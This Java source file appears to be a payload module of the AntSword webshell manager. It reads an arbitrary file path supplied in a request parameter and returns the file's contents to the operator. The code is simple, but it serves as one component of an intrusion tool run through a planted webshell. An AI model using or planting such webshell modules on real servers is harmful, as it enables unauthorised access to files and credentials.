package filemanager;

import antSword.Template;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

public class Read_file extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargpath");
        return ReadFileCode(z1);

    }

    String ReadFileCode(String filePath) throws Exception {
        String l = "", s = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath)), cs));
        while ((l = br.readLine()) != null) {
            s += l + "\r\n";
        }
        br.close();
        return s;
    }
}
